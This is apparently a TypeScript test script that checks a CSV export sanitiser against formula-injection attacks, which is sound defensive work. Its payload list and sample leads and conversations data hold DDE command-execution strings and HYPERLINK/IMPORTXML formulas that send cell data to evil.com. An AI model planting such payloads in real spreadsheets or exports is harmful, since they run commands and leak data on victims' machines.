/**
 * Manual Security Testing Script for CSV Formula Injection Protection
 *
 * This script tests the CSV export protection against formula injection attacks
 * by generating CSV files with malicious payloads and verifying they are properly sanitized.
 */

import { csvSanitize } from './apps/api/src/utils/csvSanitize';
import * as fs from 'fs';
import * as path from 'path';

// Define attack payloads as specified in the verification instructions
const ATTACK_PAYLOADS = [
  // DDE (Dynamic Data Exchange) attack - can execute arbitrary commands
  { name: 'DDE Attack', value: "=CMD|'/C calc'!A0", description: 'Attempts to execute Windows Calculator' },

  // HYPERLINK with data exfiltration
  { name: 'HYPERLINK Exfiltration', value: '=HYPERLINK("https://evil.com/"&A2,"Click me")', description: 'Attempts to exfiltrate data from cell A2' },

  // SUM formula
  { name: 'SUM Formula', value: '@SUM(1+1)*cmd|/C calc!A0', description: 'Combines SUM with command execution' },

  // Simple formula injection with each dangerous character
  { name: 'Equals Sign', value: '=1+1', description: 'Simple formula with equals sign' },
  { name: 'Plus Sign', value: '+1+1', description: 'Formula starting with plus' },
  { name: 'Minus Sign', value: '-1+1', description: 'Formula starting with minus' },
  { name: 'At Sign', value: '@SUM(A1:A10)', description: 'Formula starting with @' },
  { name: 'Tab Character', value: '\t=1+1', description: 'Formula starting with tab' },
  { name: 'Carriage Return', value: '\r=1+1', description: 'Formula starting with carriage return' },

  // Combined attacks
  { name: 'Formula with Quotes', value: '=CMD|"/C calc"!A0', description: 'DDE with double quotes' },
  { name: 'Formula with Comma', value: '=CONCATENATE("a","b")', description: 'Formula containing commas' },
  { name: 'Formula with Newline', value: '=1+1\nmalicious', description: 'Formula with newline' },

  // IMPORTXML attack
  { name: 'IMPORTXML Attack', value: '=IMPORTXML(CONCAT("http://evil.com/?v=",A2), "//a")', description: 'Attempts to make external HTTP request' },

  // Normal values (should NOT be modified)
  { name: 'Normal Text', value: 'John Doe', description: 'Regular customer name' },
  { name: 'Email', value: 'user@example.com', description: 'Regular email address' },
  { name: 'Phone', value: '+1-555-0123', description: 'Phone number with plus (but not at start after trim)' },
];

interface TestResult {
  payload: string;
  name: string;
  description: string;
  sanitized: string;
  protected: boolean;
  reason: string;
}

function testPayload(payload: typeof ATTACK_PAYLOADS[0]): TestResult {
  const sanitized = csvSanitize(payload.value);
  const trimmedValue = String(payload.value).trim();

  // Check if the value is dangerous (starts with dangerous character)
  const isDangerous = ['=', '+', '-', '@', '\t', '\r'].some(char =>
    trimmedValue.startsWith(char)
  );

  // If dangerous, it should be prefixed with single quote
  const isProtected = isDangerous ? sanitized.startsWith("'") || sanitized.startsWith('"\'') : true;

  let reason = '';
  if (isDangerous && isProtected) {
    reason = 'Dangerous character detected and neutralized with single quote prefix';
  } else if (isDangerous && !isProtected) {
    reason = '⚠️ VULNERABILITY: Dangerous character NOT neutralized!';
  } else {
    reason = 'Safe value - no modification needed';
  }

  return {
    payload: payload.value,
    name: payload.name,
    description: payload.description,
    sanitized,
    protected: isProtected,
    reason,
  };
}

function generateTestCsv(results: TestResult[]): string {
  const headers = ['Test Name', 'Original Value', 'Sanitized Value', 'Protected', 'Description'];
  const rows = results.map(r => [
    csvSanitize(r.name),
    csvSanitize(r.payload),
    csvSanitize(r.sanitized),
    csvSanitize(r.protected ? 'YES' : 'NO'),
    csvSanitize(r.description),
  ]);

  return [
    headers.join(','),
    ...rows.map(row => row.join(',')),
  ].join('\n');
}

function generateLeadsCsv(): string {
  // Simulate a leads export with malicious data
  const headers = ['id', 'name', 'email', 'phone', 'status', 'source', 'createdAt'];

  const leads = [
    ['1', "=CMD|'/C calc'!A0", 'admin@example.com', '555-0001', 'new', 'website', '2026-03-09T10:00:00Z'],
    ['2', '+1+1', 'user@evil.com', '@SUM(A1:A10)', 'contacted', '=HYPERLINK("http://evil.com")', '2026-03-09T11:00:00Z'],
    ['3', 'John Doe', 'john@example.com', '555-0123', 'converted', 'referral', '2026-03-09T12:00:00Z'],
    ['4', '-1+1', 'test@test.com', '\t=1+1', 'lost', '\r=malicious', '2026-03-09T13:00:00Z'],
    ['5', '=IMPORTXML(CONCAT("http://evil.com/?v=",A2), "//a")', 'attacker@evil.com', '555-0666', 'new', 'chat', '2026-03-09T14:00:00Z'],
  ];

  const rows = leads.map(lead => lead.map(csvSanitize));

  return [
    headers.join(','),
    ...rows.map(row => row.join(',')),
  ].join('\n');
}

function generateConversationsCsv(): string {
  // Simulate a conversations export with malicious customer names
  const headers = ['id', 'customerName', 'channel', 'status', 'messageCount', 'createdAt', 'resolvedAt'];

  const conversations = [
    ['1', "=CMD|'/C calc'!A0", 'web_chat', 'active', '5', '2026-03-09T10:00:00Z', ''],
    ['2', '@SUM(1+1)*cmd|/C calc!A0', 'email', 'resolved', '12', '2026-03-09T11:00:00Z', '2026-03-09T12:00:00Z'],
    ['3', 'Normal Customer', 'web_chat', 'active', '3', '2026-03-09T12:00:00Z', ''],
    ['4', '+malicious', 'slack', 'pending', '7', '2026-03-09T13:00:00Z', ''],
    ['5', '=HYPERLINK("https://evil.com/"&A2,"Click")', 'web_chat', 'resolved', '9', '2026-03-09T14:00:00Z', '2026-03-09T15:00:00Z'],
  ];

  const rows = conversations.map(conv => conv.map(csvSanitize));

  return [
    headers.join(','),
    ...rows.map(row => row.join(',')),
  ].join('\n');
}

// Run the tests
console.log('='.repeat(80));
console.log('CSV FORMULA INJECTION PROTECTION - SECURITY TESTING');
console.log('='.repeat(80));
console.log();

console.log('Testing all attack payloads...\n');

const results = ATTACK_PAYLOADS.map(testPayload);

// Display results
results.forEach((result, index) => {
  console.log(`Test ${index + 1}: ${result.name}`);
  console.log(`  Description: ${result.description}`);
  console.log(`  Original:    "${result.payload}"`);
  console.log(`  Sanitized:   "${result.sanitized}"`);
  console.log(`  Protected:   ${result.protected ? '✓ YES' : '✗ NO'}`);
  console.log(`  Reason:      ${result.reason}`);
  console.log();
});

// Summary
const totalTests = results.length;
const protectedTests = results.filter(r => r.protected).length;
const failedTests = results.filter(r => !r.protected);

console.log('='.repeat(80));
console.log('SUMMARY');
console.log('='.repeat(80));
console.log(`Total Tests:     ${totalTests}`);
console.log(`Protected:       ${protectedTests} ✓`);
console.log(`Failed:          ${failedTests.length} ${failedTests.length > 0 ? '⚠️' : '✓'}`);
console.log();

if (failedTests.length > 0) {
  console.log('⚠️  FAILED TESTS:');
  failedTests.forEach(f => {
    console.log(`  - ${f.name}: ${f.reason}`);
  });
  console.log();
}

// Generate CSV files for manual verification
const outputDir = './test-output';
if (!fs.existsSync(outputDir)) {
  fs.mkdirSync(outputDir, { recursive: true });
}

const testResultsCsv = generateTestCsv(results);
const leadsCsv = generateLeadsCsv();
const conversationsCsv = generateConversationsCsv();

fs.writeFileSync(path.join(outputDir, 'test-results.csv'), testResultsCsv);
fs.writeFileSync(path.join(outputDir, 'leads-export.csv'), leadsCsv);
fs.writeFileSync(path.join(outputDir, 'conversations-export.csv'), conversationsCsv);

console.log('='.repeat(80));
console.log('CSV FILES GENERATED');
console.log('='.repeat(80));
console.log(`Output directory: ${path.resolve(outputDir)}`);
console.log();
console.log('Generated files:');
console.log('  1. test-results.csv       - Summary of all test cases');
console.log('  2. leads-export.csv       - Sample leads export with attack payloads');
console.log('  3. conversations-export.csv - Sample conversations export with attack payloads');
console.log();
console.log('MANUAL VERIFICATION STEPS:');
console.log('1. Open each CSV file in Microsoft Excel');
console.log('2. Open each CSV file in Google Sheets');
console.log('3. Open each CSV file in LibreOffice Calc');
console.log('4. Verify that NO formulas execute (no calculator opens, no HTTP requests)');
console.log('5. Verify that cells starting with dangerous characters show the literal value');
console.log('   with a single quote prefix (e.g., \'=1+1 should display as \'=1+1)');
console.log();
console.log('EXPECTED BEHAVIOR:');
console.log('✓ Values starting with =, +, -, @, tab, or CR should be prefixed with single quote');
console.log('✓ Formulas should NOT execute - they should display as literal text');
console.log('✓ No security warnings should appear when opening the files');
console.log('✓ Normal values (like "John Doe") should remain unchanged');
console.log();

if (protectedTests === totalTests) {
  console.log('✓ ALL TESTS PASSED - CSV formula injection protection is working correctly!');
  console.log();
  process.exit(0);
} else {
  console.log('✗ SOME TESTS FAILED - Please review the failed tests above');
  console.log();
  process.exit(1);
}
